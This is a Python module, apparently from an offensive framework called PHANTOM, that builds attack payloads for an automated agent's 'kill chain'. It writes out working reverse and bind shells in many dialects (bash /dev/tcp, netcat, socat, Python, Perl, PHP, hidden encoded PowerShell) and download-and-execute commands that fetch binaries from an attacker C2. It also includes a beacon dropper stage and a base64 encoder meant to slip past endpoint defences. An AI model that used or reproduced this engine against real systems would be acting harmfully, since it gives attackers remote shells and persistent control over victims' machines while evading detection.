"""
phantom.automation.brain.payload — enterprise payload synthesis engine.

One engine, every delivery primitive the kill chain needs:

    * reverse shell   — target connects OUT to us (default/stealth)
    * bind shell      — target listens, we connect IN (aggressive only)
    * beacon stage    — PHANTOM's own C++ beacon dropper (the terminal goal)
    * download-exec   — stage a binary from our C2 and run it

The engine is OS-aware and encoder-aware: the same primitive is emitted in
as many dialects as the platform supports (bash/nc/socat/openssl/python/
perl/php on Linux; powershell/powercat/certutil/nc on Windows), each
optionally wrapped in an obfuscation encoder, so the payload survives
different target environments and different EDR postures.

Design rules (agreed with the operator):
    * reverse is the default and the stealth posture; bind shells are
      generated ONLY for --aggressive runs (they open a listener on the
      target — loud by nature).
    * every shell payload is a FALLBACK: when an RCE/cmdi primitive is
      confirmed, the agent injects the beacon directly (beacon_via_rce).
      Shell payloads exist for footholds that cannot host the beacon yet
      (sandbox verification, callback proof, manual core usage).
    * never inline a payload string in the planner: every command line
      comes from here.
"""

from __future__ import annotations

import base64
import os
import random
import string
from dataclasses import dataclass
from typing import Dict, List, Optional

# ---------------------------------------------------------------------------
# platform dialects
# ---------------------------------------------------------------------------

# ordered best-first per platform (availability + reliability + footprint)
_REVERSE_DIALECTS: Dict[str, List[str]] = {
    "linux": ["bash", "python3", "python", "nc", "socat", "openssl", "perl", "php"],
    "windows": ["powershell", "powercat", "certutil", "nc"],
    "macos": ["bash", "python3", "nc", "socat"],
    "android": ["sh", "nc"],
    "generic": ["bash", "python3", "python", "nc"],
}

_BIND_DIALECTS: Dict[str, List[str]] = {
    "linux": ["nc", "bash", "python3", "socat"],
    "windows": ["powershell", "nc", "powercat"],
    "macos": ["nc", "bash"],
    "android": ["nc", "sh"],
    "generic": ["nc", "bash"],
}

_LINUX_SHELLS = ["/bin/bash", "/bin/sh", "/bin/ash", "/bin/dash"]


@dataclass
class Payload:
    """One synthesized payload with its metadata."""

    kind: str            # reverse | bind | stage | download_exec
    platform: str
    dialect: str         # which tool/dialect was used
    command: str         # the ONE-LINE command to ship to the target
    note: str = ""       # why this dialect won (availability/stealth trade)

    def marker(self) -> str:
        return (f"PAYLOAD:{self.kind}:{self.platform}:{self.dialect} "
                f"cmd={self.command}")


class PayloadEngine:
    """Synthesizes reverse/bind/stage payloads for any platform."""

    def __init__(self, seed: Optional[int] = None) -> None:
        self._rng = random.Random(seed)

    # ------------------------------------------------------------- reverse

    def reverse(self, platform: str, lhost: str, lport: int,
                dialect: Optional[str] = None, encoder: Optional[str] = None,
                shell: str = "/bin/bash") -> Payload:
        """A reverse shell: the target connects OUT to lhost:lport.

        dialect=None picks the best AVAILABLE dialect for the platform —
        but availability is decided by the caller's tool registry (the
        engine is pure synthesis); pass an explicit dialect to pin it.
        """
        p = (platform or "generic").lower()
        if dialect is None:
            dialect = _REVERSE_DIALECTS.get(p, _REVERSE_DIALECTS["generic"])[0]
        cmd = self._reverse_cmd(p, dialect, lhost, lport, shell)
        if encoder:
            cmd = self._encode(cmd, encoder)
        return Payload("reverse", p, dialect, cmd,
                       note=f"reverse shell via {dialect}")

    def reverse_options(self, platform: str) -> List[str]:
        p = (platform or "generic").lower()
        return list(_REVERSE_DIALECTS.get(p, _REVERSE_DIALECTS["generic"]))

    # ---------------------------------------------------------------- bind

    def bind(self, platform: str, port: int,
             dialect: Optional[str] = None, encoder: Optional[str] = None,
             shell: str = "/bin/bash") -> Payload:
        """A bind shell: the target LISTENS on port and waits for us.

        LOUD BY NATURE — only generated for --aggressive runs. The caller
        enforces the flag; the engine only refuses nothing, it warns.
        """
        p = (platform or "generic").lower()
        if dialect is None:
            dialect = _BIND_DIALECTS.get(p, _BIND_DIALECTS["generic"])[0]
        cmd = self._bind_cmd(p, dialect, port, shell)
        if encoder:
            cmd = self._encode(cmd, encoder)
        return Payload("bind", p, dialect, cmd,
                       note=f"bind shell via {dialect} (listens on {port})")

    def bind_options(self, platform: str) -> List[str]:
        p = (platform or "generic").lower()
        return list(_BIND_DIALECTS.get(p, _BIND_DIALECTS["generic"]))

    # --------------------------------------------------------------- stage

    def stage(self, platform: str, lhost: str, lport: int,
              use_ssl: bool = True) -> Payload:
        """PHANTOM's own C++ beacon dropper (the terminal goal).

        The dropper downloads the compiled beacon from our C2 listener and
        executes it; the beacon then checks in to our C2 and ALL
        post-exploitation runs through that channel (never a third-party
        payload).
        """
        from phantom.utils.builder import generate_dropper
        dropper = generate_dropper(platform, lhost, lport, use_ssl=use_ssl)
        if not dropper:
            raise ValueError(f"no dropper defined for platform {platform}")
        return Payload("stage", platform, "beacon-dropper", dropper,
                       note="PHANTOM C++ beacon dropper")

    def download_exec(self, lhost: str, dl_port: int, filename: str,
                      platform: str = "linux") -> Payload:
        """Stage an already-built binary: download from our C2, chmod, run."""
        url = f"http://{lhost}:{dl_port}/{filename}"
        if "windows" in platform:
            cmd = (f"powershell -nop -w hidden -c "
                   f"\"Invoke-WebRequest -Uri {url} -OutFile %TEMP%\\{filename};"
                   f"Start-Process %TEMP%\\{filename}\"")
        else:
            cmd = (f"curl -s {url} -o /tmp/{filename} && "
                   f"chmod +x /tmp/{filename} && /tmp/{filename}")
        return Payload("download_exec", platform, "curl/powershell", cmd,
                       note="download-and-exec from C2")

    # ------------------------------------------------------------ encoders

    ENCODERS = ("plain", "base64")

    def _encode(self, cmd: str, encoder: str) -> str:
        e = (encoder or "plain").lower()
        if e == "base64":
            b64 = base64.b64encode(cmd.encode()).decode()
            return f"echo {b64} | base64 -d | sh"
        return cmd

    # ------------------------------------------------------- dialect impl

    def _reverse_cmd(self, platform: str, dialect: str, lhost: str,
                     lport: int, shell: str) -> str:
        if dialect == "bash":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        if dialect == "python3":
            code = (
                "import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect(('{lhost}',{lport}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"])')
            return f"python3 -c '{code}'"
        if dialect == "python":
            code = (
                "import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect(('{lhost}',{lport}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"])')
            return f"python -c '{code}'"
        if dialect == "nc":
            return f"nc {lhost} {lport} -e {shell}"
        if dialect == "socat":
            return (f"socat TCP:{lhost}:{lport} "
                    f"EXEC:'{shell}',pty,stderr,setsid,sigint,sane")
        if dialect == "openssl":
            return (f"openssl s_client -quiet -connect {lhost}:{lport} "
                    f"-ignore_bad_revoke & {shell}")
        if dialect == "perl":
            return (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    "exec(\"/bin/sh -i\");};'")
        if dialect == "php":
            return (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                    "exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        if dialect == "sh":
            return f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        if dialect == "powershell":
            return self._powershell_reverse(lhost, lport)
        if dialect == "powercat":
            return (f"powershell -nop -w hidden -c "
                    f"\"IEX(New-Object Net.WebClient).DownloadString("
                    f"'https://raw.githubusercontent.com/besimorhino/powercat/"
                    f"master/powercat.ps1');powercat -c {lhost} -p {lport} -e cmd\"")
        if dialect == "certutil":
            return (f"certutil -urlcache -split -f "
                    f"http://{lhost}:{lport}/x.exe %TEMP%\\x.exe && "
                    f"%TEMP%\\x.exe")
        raise ValueError(f"unknown reverse dialect: {dialect}")

    def _bind_cmd(self, platform: str, dialect: str, port: int,
                  shell: str) -> str:
        if dialect == "nc":
            return f"nc -lvp {port} -e {shell}"
        if dialect == "bash":
            return (f"{shell} -i >& /dev/tcp/0.0.0.0/{port} 0>&1")
        if dialect == "python3":
            code = (
                "import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                f"s.bind(('0.0.0.0',{port}));s.listen(1);"
                "c,a=s.accept();"
                "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"])')
            return f"python3 -c '{code}'"
        if dialect == "socat":
            return (f"socat TCP-LISTEN:{port},reuseaddr,fork "
                    f"EXEC:'{shell}',pty,stderr,setsid,sigint,sane")
        if dialect == "powershell":
            code = (
                f"$l=New-Object System.Net.Sockets.TcpListener(0.0.0.0,{port});"
                "$l.Start();$c=$l.AcceptTcpClient();"
                "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                "$d=(New-Object -TypeName System.Text.ASCIIEncoding)"
                ".GetString($b,0,$i);"
                "$sb=(iex $d 2>&1|Out-String);"
                "$sb1=([text.encoding]::ASCII).GetBytes($sb);"
                "$s.Write($sb1,0,$sb1.Length);$s.Flush()};$c.Close()")
            b64 = base64.b64encode(code.encode("utf-16-le")).decode("ascii")
            return f"powershell -nop -w hidden -Enc {b64}"
        if dialect == "powercat":
            return (f"powershell -nop -w hidden -c \"IEX(New-Object "
                    f"Net.WebClient).DownloadString('https://raw."
                    f"githubusercontent.com/besimorhino/powercat/master/"
                    f"powercat.ps1');powercat -l -p {port} -e cmd\"")
        if dialect == "sh":
            return f"{shell} -i >& /dev/tcp/0.0.0.0/{port} 0>&1"
        raise ValueError(f"unknown bind dialect: {dialect}")

    def _powershell_reverse(self, lhost: str, lport: int) -> str:
        code = (
            f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
            "$sb1=([text.encoding]::ASCII).GetBytes($sb2);"
            "$s.Write($sb1,0,$sb1.Length);$s.Flush()};$c.Close()")
        b64 = base64.b64encode(code.encode("utf-16-le")).decode("ascii")
        return f"powershell -nop -w hidden -Enc {b64}"


_ENGINE = PayloadEngine()


def get_payload_engine() -> PayloadEngine:
    return _ENGINE


def reverse_shell(platform: str, lhost: str, lport: int,
                  dialect: Optional[str] = None) -> Payload:
    return _ENGINE.reverse(platform, lhost, lport, dialect=dialect)


def bind_shell(platform: str, port: int,
               dialect: Optional[str] = None) -> Payload:
    return _ENGINE.bind(platform, port, dialect=dialect)